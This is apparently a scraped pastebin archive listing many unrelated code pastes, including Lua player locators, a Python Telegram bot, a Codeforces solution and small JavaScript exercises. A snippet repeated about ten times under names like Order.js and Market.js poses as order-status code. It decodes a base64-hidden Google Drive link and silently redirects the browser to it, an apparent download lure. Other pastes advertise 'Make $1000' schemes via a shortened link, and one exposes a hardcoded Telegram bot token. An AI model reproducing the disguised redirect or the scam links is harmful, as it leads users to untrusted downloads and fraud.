    SetWindowLongPtr(hWnd, GWL_EXSTYLE, GetWindowLongPtr(hWnd, GWL_EXSTYLE) | WS_EX_COMPOSITED);
    ShowWindow(hWnd, SW_SHOWMAXIMIZED);
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
```"
5xfEWNg1,Untitled,Hasli4,Python,Thursday 27th of March 2025 12:38:37 PM CDT,"# -*- coding: utf-8 -*-
import telebot
import json
import nltk
import os
from nltk.corpus import stopwords
from nltk.tokenize import word_tokenize

# Загрузка необходимых NLTK ресурсов
nltk.download('punkt', quiet=True)
nltk.download('stopwords', quiet=True)

class TelegramChatbot:
    def __init__(self, token, reference_file='reference_guide.json'):
        # Инициализация бота и справочника
        self.bot = telebot.TeleBot(token)
        self.reference_file = reference_file
        self.knowledge_base = self.load_reference_file()
        
        # Регистрация обработчиков команд
        self.register_handlers()

    def load_reference_file(self):
        """"""Загрузка справочника из JSON файла""""""
        try:
            if not os.path.exists(self.reference_file):
                # Создание пустого справочника, если файл не существует
                return {}
            
            with open(self.reference_file, 'r', encoding='utf-8') as file:
                return json.load(file)
        except Exception as e:
            print(f""Ошибка при загрузке справочника: {e}"")
            return {}

    def save_reference_file(self):
        """"""Сохранение справочника в JSON файл""""""
        try:
            with open(self.reference_file, 'w', encoding='utf-8') as file:
                json.dump(self.knowledge_base, file, ensure_ascii=False, indent=4)
        except Exception as e:
            print(f""Ошибка при сохранении справочника: {e}"")

    def register_handlers(self):
        """"""Регистрация обработчиков сообщений""""""
        @self.bot.message_handler(commands=['start', 'help'])
        def send_welcome(message):
            welcome_text = (
                ""Привет! Я чат-бот с возможностью поиска информации в справочнике. \n""
                ""Команды:\n""
                ""/start - запуск бота\n""
                ""/help - помощь\n""
                ""/add - добавить новую запись в справочник\n""
                ""/exit - завершить работу бота""
            )
            self.bot.reply_to(message, welcome_text)

        @self.bot.message_handler(commands=['add'])
        def add_reference(message):
            msg = self.bot.reply_to(message, ""Введите ключ и значение через ':' (например, 'университет: Синергия')"")
            self.bot.register_next_step_handler(msg, self.process_reference_step)

        @self.bot.message_handler(commands=['exit'])
        def exit_bot(message):
            self.bot.reply_to(message, ""До свидания!"")
            self.save_reference_file()
            os._exit(0)

        @self.bot.message_handler(func=lambda message: True)
        def process_message(message):
            if message.text.lower() == 'выход':
                exit_bot(message)
                return

            answer = self.process_message_text(message.text)
            self.bot.reply_to(message, answer)

    def process_reference_step(self, message):
        """"""Обработка добавления новой записи в справочник""""""
        try:
            key, value = message.text.split(':', 1)
            key = key.strip()
            value = value.strip()
            
            self.knowledge_base[key] = value
            self.bot.reply_to(message, f""Добавлена запись: '{key}': '{value}'"")
        except Exception as e:
            self.bot.reply_to(message, ""Ошибка при добавлении записи. Используйте формат 'ключ: значение'"")

    def preprocess_text(self, text):
        """"""Предобработка текста: токенизация и удаление стоп-слов""""""
        tokens = word_tokenize(text.lower())
        stop_words = set(stopwords.words('russian'))
        filtered_tokens = [word for word in tokens if word not in stop_words]
        return filtered_tokens

    def find_best_match(self, tokens):
        """"""Поиск наилучшего совпадения в справочнике""""""
        best_match = None
        max_match_score = 0

        for key, value in self.knowledge_base.items():
            key_tokens = self.preprocess_text(key)
            
            # Подсчет совпадающих токенов
            match_score = len(set(tokens) & set(key_tokens))
            
            if match_score > max_match_score:
                max_match_score = match_score
                best_match = value

        return best_match if best_match else ""Извините, информация не найдена.""

    def process_message_text(self, text):
        """"""Обработка входящего сообщения""""""
        if text.lower() == 'привет':
            return ""Привет! Чем могу помочь?""
        
        tokens = self.preprocess_text(text)
        return self.find_best_match(tokens)

    def run(self):
        """"""Запуск бота""""""
        print(""Бот запущен..."")
        self.bot.polling(none_stop=True)

def main():
    # Токен вашего Telegram бота
    TOKEN = '8056069105:AAFYORLCIvp_ImOrFomRakkcpEIhDDMixCA'
    
    # Создание и запуск бота
    bot = TelegramChatbot(TOKEN)
    bot.run()

if __name__ == '__main__':
    main()"
cuw7TBG9,Untitled,rodrigomaise99,JavaScript,Thursday 27th of March 2025 12:37:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/407/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
m5FbsWrE,Random Gmail Acc 1A,WestinManila21,JavaScript,Thursday 27th of March 2025 12:25:55 PM CDT," 
Pdf https://tinyurl.com/methodssss


Xw2ZoOO8yo
"
dk4LzNZn,Products.js,dentira,JavaScript,Thursday 27th of March 2025 12:22:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/123/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1tw7g57x,UWU,yeeeeeeeeeeeee,Lua,Thursday 27th of March 2025 12:17:28 PM CDT,"-- Wrap peripherals
local monitor = peripheral.wrap(""top"")
local silo = peripheral.wrap(""left"")
local playerDetector = peripheral.wrap(""right"")

-- Setup the monitor
monitor.clear()
monitor.setTextScale(1)
monitor.setTextColor(colors.white)
monitor.setBackgroundColor(colors.black)

-- Monitor dimensions
local width, height = monitor.getSize()

-- Table to store player names and their displayed positions
local playerDisplay = {}
local selectedPlayer = nil -- Store the selected player's name

-- Helper function to update the monitor
local function updateMonitor(players)
    monitor.clear()
    playerDisplay = {} -- Reset playerDisplay table
    
    if #players > 0 then
        monitor.setCursorPos(1, 1)
        monitor.setTextColor(colors.cyan)
        monitor.write(""Players Nearby:"")

        for i, player in ipairs(players) do
            local x = 2
            local y = i + 2
            playerDisplay[i] = { name = player, posX = x, posY = y }
            monitor.setCursorPos(x, y)
            if player == selectedPlayer then
                monitor.setTextColor(colors.green) -- Highlight selected player
            else
                monitor.setTextColor(colors.white)
            end
            monitor.write(player)
        end
    else
        monitor.setCursorPos(1, math.floor(height / 2))
        monitor.setTextColor(colors.red)
        monitor.write(""No Players Detected"")
    end
end

-- Helper function to display player coordinates
local function displayPlayerCoords()
    while selectedPlayer do
        local coords = playerDetector.getPlayerCoords(selectedPlayer)
        
        -- Clear only the coordinate section
        monitor.setBackgroundColor(colors.black)
        for i = height - 5, height - 2 do
            monitor.setCursorPos(1, i)
            monitor.write(string.rep("" "", width))
        end

        monitor.setCursorPos(1, height - 5)
        monitor.setTextColor(colors.yellow)
        monitor.write(""Player: "" .. selectedPlayer)
        if coords then
            monitor.setCursorPos(1, height - 4)
            monitor.write(""X: "" .. coords.x)
            monitor.setCursorPos(1, height - 3)
            monitor.write(""Y: "" .. coords.y)
            monitor.setCursorPos(1, height - 2)
            monitor.write(""Z: "" .. coords.z)
        else
            monitor.setCursorPos(1, height - 4)
            monitor.setTextColor(colors.red)
            monitor.write(""Coordinates unavailable."")
        end
        sleep(1) -- Update every second
    end
end

-- Main loop
while true do
    -- Check player detector
    local players = playerDetector.getPlayersInRange(1000000) -- ""Infinite"" range
    updateMonitor(players)

    -- Wait for a monitor touch event
    local event, side, x, y = os.pullEvent(""monitor_touch"")

    -- Check if a player name was clicked
    for _, player in pairs(playerDisplay) do
        if x >= player.posX and x <= player.posX + #player.name and y == player.posY then
            selectedPlayer = player.name
            parallel.waitForAny(displayPlayerCoords)
            break
        end
    end
    
    -- Sleep to avoid overwhelming the server
    sleep(1)
end"
FrW4HT84,sus,yeeeeeeeeeeeee,Lua,Thursday 27th of March 2025 12:14:42 PM CDT,"-- Wrap peripherals
local monitor = peripheral.wrap(""top"")
local silo = peripheral.wrap(""left"")
local playerDetector = peripheral.wrap(""right"")

-- Setup the monitor
monitor.clear()
monitor.setTextScale(1)
monitor.setTextColor(colors.white)
monitor.setBackgroundColor(colors.black)

-- Monitor dimensions
local width, height = monitor.getSize()

-- Table to store player names and their displayed positions
local playerDisplay = {}
local selectedPlayer = nil -- Store the selected player's name

-- Helper function to update the monitor
local function updateMonitor(players)
    monitor.clear()
    playerDisplay = {} -- Reset playerDisplay table
    
    if #players > 0 then
        monitor.setCursorPos(1, 1)
        monitor.write(""Players Nearby:"")

        for i, player in ipairs(players) do
            local x = 2
            local y = i + 2
            playerDisplay[i] = { name = player, posX = x, posY = y }
            monitor.setCursorPos(x, y)
            if player == selectedPlayer then
                monitor.setTextColor(colors.green) -- Highlight selected player
            else
                monitor.setTextColor(colors.white)
            end
            monitor.write(player)
        end
    else
        monitor.setCursorPos(1, math.floor(height / 2))
        monitor.write(""No Players Detected"")
    end
end

-- Helper function to display player coordinates on the monitor
local function displayPlayerCoords(playerName)
    if not playerDetector.getPlayerCoords then
        return -- Do nothing if unsupported
    end
    
    while selectedPlayer == playerName do
        local coords = playerDetector.getPlayerCoords(playerName)
        
        if coords then
            monitor.setCursorPos(1, height - 5)
            monitor.setTextColor(colors.yellow)
            monitor.write(""Player: "" .. playerName)
            monitor.setCursorPos(1, height - 4)
            monitor.write(""X: "" .. coords.x)
            monitor.setCursorPos(1, height - 3)
            monitor.write(""Y: "" .. coords.y)
            monitor.setCursorPos(1, height - 2)
            monitor.write(""Z: "" .. coords.z)
        else
            monitor.setCursorPos(1, height - 5)
            monitor.setTextColor(colors.red)
            monitor.write(""Coordinates unavailable."")
        end
        
        sleep(1) -- Update every second
    end
end

-- Main loop
while true do
    -- Check player detector
    local players = playerDetector.getPlayersInRange(1000000) -- ""Infinite"" range
    updateMonitor(players)

    -- Wait for a monitor touch event
    local event, side, x, y = os.pullEvent(""monitor_touch"")

    -- Check if a player name was clicked
    for _, player in pairs(playerDisplay) do
        if x >= player.posX and x <= player.posX + #player.name and y == player.posY then
            selectedPlayer = player.name
            parallel.waitForAny(
                function() displayPlayerCoords(player.name) end,
                function()
                    while selectedPlayer == player.name do
                        sleep(0.1)
                    end
                end
            )
            break
        end
    end
    
    -- Sleep to avoid overwhelming the server
    sleep(1)
end"
ymJNyqxN,test 100,yeeeeeeeeeeeee,Lua,Thursday 27th of March 2025 12:12:55 PM CDT,"-- Wrap peripherals
local monitor = peripheral.wrap(""top"")
local silo = peripheral.wrap(""left"")
local playerDetector = peripheral.wrap(""right"")

-- Setup the monitor
monitor.clear()
monitor.setTextScale(1)
monitor.setTextColor(colors.white)
monitor.setBackgroundColor(colors.black)

-- Monitor dimensions
local width, height = monitor.getSize()

-- Table to store player names and their displayed positions
local playerDisplay = {}

-- Helper function to update the monitor
local function updateMonitor(players)
    monitor.clear()
    playerDisplay = {} -- Reset playerDisplay table
    if #players > 0 then
        monitor.setCursorPos(1, 1)
        monitor.write(""Players Nearby:"")

        for i, player in ipairs(players) do
            local x = 2
            local y = i + 2
            playerDisplay[i] = { name = player, posX = x, posY = y }
            monitor.setCursorPos(x, y)
            monitor.write(player)
        end
    else
        monitor.setCursorPos(1, math.floor(height / 2))
        monitor.write(""No Players Detected"")
    end
end

-- Helper function to display player coordinates on the monitor
local function displayPlayerCoords(playerName)
    if not playerDetector.getPlayerCoords then
        monitor.clear()
        monitor.setCursorPos(1, 1)
        monitor.write(""Player: "" .. playerName)
        monitor.setCursorPos(1, 2)
        monitor.write(""Coordinates unavailable (unsupported)."")
        sleep(3) -- Display the message for 3 seconds
        return
    end

    local coords = playerDetector.getPlayerCoords(playerName)
    monitor.clear()
    if coords then
        monitor.setCursorPos(1, 1)
        monitor.write(""Player: "" .. playerName)
        monitor.setCursorPos(1, 2)
        monitor.write(""Coordinates:"")
        monitor.setCursorPos(1, 3)
        monitor.write(""X: "" .. coords.x)
        monitor.setCursorPos(1, 4)
        monitor.write(""Y: "" .. coords.y)
        monitor.setCursorPos(1, 5)
        monitor.write(""Z: "" .. coords.z)
    else
        monitor.setCursorPos(1, 1)
        monitor.write(""Coordinates unavailable."")
    end
    sleep(3) -- Display coordinates for 3 seconds
end

-- Main loop
while true do
    -- Check player detector
    local players = playerDetector.getPlayersInRange(1000000) -- ""Infinite"" range
    updateMonitor(players)

    -- Wait for a monitor touch event
    local event, side, x, y = os.pullEvent(""monitor_touch"")

    -- Check if a player name was clicked
    for _, player in pairs(playerDisplay) do
        if x >= player.posX and x <= player.posX + #player.name and y == player.posY then
            displayPlayerCoords(player.name)
            break
        end
    end

    -- Sleep to avoid overwhelming the server
    sleep(1)
end
"
HChqaHFw,player locator,yeeeeeeeeeeeee,Lua,Thursday 27th of March 2025 12:10:13 PM CDT,"-- Wrap peripherals
local monitor = peripheral.wrap(""top"")
local silo = peripheral.wrap(""left"")
local playerDetector = peripheral.wrap(""right"")

-- Setup the monitor
monitor.clear()
monitor.setTextScale(1)
monitor.setTextColor(colors.white)
monitor.setBackgroundColor(colors.black)

-- Monitor dimensions
local width, height = monitor.getSize()

-- Table to store player names and their displayed positions
local playerDisplay = {}

-- Helper function to update the monitor
local function updateMonitor(players)
    monitor.clear()
    playerDisplay = {} -- Reset playerDisplay table
    if #players > 0 then
        monitor.setCursorPos(1, 1)
        monitor.write(""Players Nearby:"")

        for i, player in ipairs(players) do
            local x = 2
            local y = i + 2
            playerDisplay[i] = { name = player, posX = x, posY = y }
            monitor.setCursorPos(x, y)
            monitor.write(player)
        end
    else
        monitor.setCursorPos(1, math.floor(height / 2))
        monitor.write(""No Players Detected"")
    end
end

-- Helper function to display player coordinates on the monitor
local function displayPlayerCoords(playerName)
    local coords = playerDetector.getPlayerCoords(playerName)
    monitor.clear()
    if coords then
        monitor.setCursorPos(1, 1)
        monitor.write(""Player: "" .. playerName)
        monitor.setCursorPos(1, 2)
        monitor.write(""Coordinates:"")
        monitor.setCursorPos(1, 3)
        monitor.write(""X: "" .. coords.x)
        monitor.setCursorPos(1, 4)
        monitor.write(""Y: "" .. coords.y)
        monitor.setCursorPos(1, 5)
        monitor.write(""Z: "" .. coords.z)
    else
        monitor.setCursorPos(1, 1)
        monitor.write(""Coordinates unavailable."")
    end
    sleep(3) -- Display coordinates for 3 seconds
end

-- Main loop
while true do
    -- Check player detector
    local players = playerDetector.getPlayersInRange(1000000) -- ""Infinite"" range
    updateMonitor(players)

    -- Wait for a monitor touch event
    local event, side, x, y = os.pullEvent(""monitor_touch"")

    -- Check if a player name was clicked
    for _, player in pairs(playerDisplay) do
        if x >= player.posX and x <= player.posX + #player.name and y == player.posY then
            displayPlayerCoords(player.name)
            break
        end
    end

    -- Sleep to avoid overwhelming the server
    sleep(1)
end
"
XLX6yZNb,Make $1000 15-MINUTES (BEGINNER) WM,urubras,JavaScript,Thursday 27th of March 2025 12:09:53 PM CDT," 
Pdf https://tinyurl.com/methodssss


ZpyBazHDly
"
vfqipXtn,CF1894D,pb_jiang,C++,Thursday 27th of March 2025 12:09:50 PM CDT,"// Problem: D. Neutral Tonality
// Contest: Codeforces - Codeforces Round 908 (Div. 2)
// URL: https://codeforces.com/problemset/problem/1894/D
// Memory Limit: 512 MB
// Time Limit: 3000 ms
//
// Powered by CP Editor (https://cpeditor.org)

#include <assert.h>
#include <bits/stdc++.h>
using namespace std;
#ifndef __DEBUG__
#define dbg(...) 42
#endif
template <class T> using mpq = priority_queue<T, vector<T>, greater<T>>;

using ll = long long;
using a2l = array<ll, 2>;
using pll = pair<ll, ll>;
using vl = vector<ll>;

void solve()
{
    ll n, m;
    cin >> n >> m;
    vl a(n), b(m), dp(n, LLONG_MAX), c;
    for (auto &x : a)
        cin >> x;
    for (auto &x : b)
        cin >> x;
    ranges::sort(b);

    for (auto x : a) {
        auto it = lower_bound(dp.begin(), dp.end(), x);
        while (b.empty() == false && b.back() >= x) {
            c.push_back(b.back());
            b.pop_back();
        }
        *it = x;
        c.push_back(x);
    }
    while (b.empty() == false) {
        c.push_back(b.back());
        b.pop_back();
    }
    for (auto x : c)
        cout << x << ' ';
    cout << '\n';
}

int main(int argc, char **argv)
{
    ll t;
    cin >> t;
    while (t--)
        solve();
    return 0;
};
"
nzw5zdRE,Order.js,dentira,JavaScript,Thursday 27th of March 2025 12:07:22 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/050/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kcYGLdUt,Untitled,Onesible,JavaScript,Thursday 27th of March 2025 12:03:41 PM CDT,"function solve() {
    document.querySelectorAll('button').forEach(b => b.addEventListener('click', showInfo));

    function showInfo(e) {
        let hidden = e.target.parentElement.getElementsByClassName('hidden-fields active')[0];
        let unlockButton = e.target.parentElement.querySelectorAll('input[type=""radio""]')[1];

        if (e.target.textContent === 'Show more') {
            if (unlockButton.checked) {
                hidden.style.display = 'block';
                e.target.textContent = 'Show less'
            }
        } else {
            if (unlockButton.checked) {
                hidden.style.display = 'none';
                e.target.textContent = 'Show more'
            }
        }
    }
}"
DRsbJpsA,Untitled,Onesible,JavaScript,Thursday 27th of March 2025 11:45:25 AM CDT,"function solve() {
    let ratios = { days: 1, hours: 24, minutes: 1440, seconds: 86400 };
    let inputs = {
        days: document.getElementById('days-input'),
        hours: document.getElementById('hours-input'),
        minutes: document.getElementById('minutes-input'),
        seconds: document.getElementById('seconds-input')
    };

    for (let unit in ratios) {
        document.getElementById(unit + 'Btn').addEventListener('click', (event) => {
            event.preventDefault();

            let value = Number(inputs[unit].value);
            if (value < 1) {
                return;
            }

            let inDays = value / ratios[unit];
            for (let u in ratios) {
                inputs[u].value = (inDays * ratios[u]).toFixed(2);
            }
        });
    }

    let clearBtn = document.createElement('input');
    clearBtn.type = 'button';
    clearBtn.value = 'Clear';
    document.getElementsByTagName('main')[0].appendChild(clearBtn);

    clearBtn.addEventListener('click', () => {
        for (let input of Object.values(inputs)) {
            input.value = '';
        }
    });
}
"
Bfqx1Xre,Market.js,dentira,JavaScript,Thursday 27th of March 2025 11:42:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/655/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CEhR35Ln,Untitled,dentira,JavaScript,Thursday 27th of March 2025 11:27:17 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/951/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZRr7HD2q,Firebase Database,ariefhendra,JSON,Thursday 27th of March 2025 11:13:22 AM CDT,"{
  ""UsersData"" : {
    ""ISIKAN_DENGAN_USER_UID"" : {
      ""outputs"" : {
        ""digital"" : {
          ""2"" : 0,
          ""12"" : 1
        },
        ""message"" : ""I love this app"",
        ""pwm"" : {
          ""13"" : 20,
          ""14"" : 80
        }
      },
      ""sensor"" : {
        ""humidity"" : 52.50,
        ""pressure"" : 1006.13,
        ""temperature"" : 25.00
      }
    }
  }
}
"
fGgBvCv5,Products.js,dentira,JavaScript,Thursday 27th of March 2025 11:11:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/533/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
05UGbSYX,Order.js,dentira,JavaScript,Thursday 27th of March 2025 10:56:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/279/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SC7MBWga,Market.js,dentira,JavaScript,Thursday 27th of March 2025 10:41:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/571/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6JFpc74j,tier list,Bresolini,Bash,Thursday 27th of March 2025 10:32:51 AM CDT,"# Comando !fiel: objetivo -> informar se o fiel que usou o comando está na Tier List dos Fiéis.
# Vantagens:
#  (1) não limita a 500 caracteres, possibilitando novas frases;
#  (2) facilidade de correção ou incremento de texto
#  (3) flexibiliza a estrutura da frase.
# Sintaxe (esperada):
#  1. !fiel           => retorna ✅ se o fiel estiver na tier list e ☑️ se já foi escolhido a foto para colocá-lo mas ainda falta add
# Variáveis:
#  *
# Criar/Editar
# !cmd edit fiel $(customapi.https://api.thefyrewire.com/twitch/pastebin/6JFpc74j?comments=true&filter=$(sender))
#
# Desenvolvido por Bresolini.

# 1-10 
:[Lelite_, marcos_paulo_42, Nanicalol, wCaju, Volta_teamo, Alcides2, Poppay, Ryann11n, JhonAlves129, PimPomzinha] ✅
# 11-20
:[Donn_WR, Tealzlol, Rotheraa, Guhstav0, ThalesHawk, Chora_br, Betotoso1, Kappa_slow, Alastel, Acce4] ✅
# 21-30
:[Donn_WR, Tealzlol, Rotheraa, Guhstav0, ThalesHawk, Chora_br, Betotoso1, Kappa_slow, Alastel, k1rspin] ✅
# 31-40
:[Mefe_UwU, VanessaCristinyy, ManoPeralta, Sayuzinho, TucanoDoPix, JalyRN, Miyasz_, itshaard, Jhongotest, kawaruh] ✅
# 41-50
:[lucawolf47, m4rkooss, pequenamevis, rayquaza_w, sarraphael, spamdegalo, stetofonendoscopio, trystavo, vandersarluvsx, andersonsfbr] ✅
# 51-60
:[jorge_eduardo_rs, Top 3 Ez, Mono_Diff, Seuvaaagemmmm, milhoonario, alortigara, soninholol, jeansilva_1, thiago_nuness, GabsWR] ✅
# 61-70
:[kryptonitawf, Tati_sz, HellenS3, htt_pssego, BaianooNTJ, ArnautWR] ✅
# Ainda faltam adicionar
:[FeyPJB, zekrumagnus, bibi_metal, Sanji_Fake, Allan280, eemanyu, lHookBoy] ☑️


# Caso a pessoa não esteja na tier list
❌

"
m06QB0iu,Untitled,dentira,JavaScript,Thursday 27th of March 2025 10:25:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/628/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

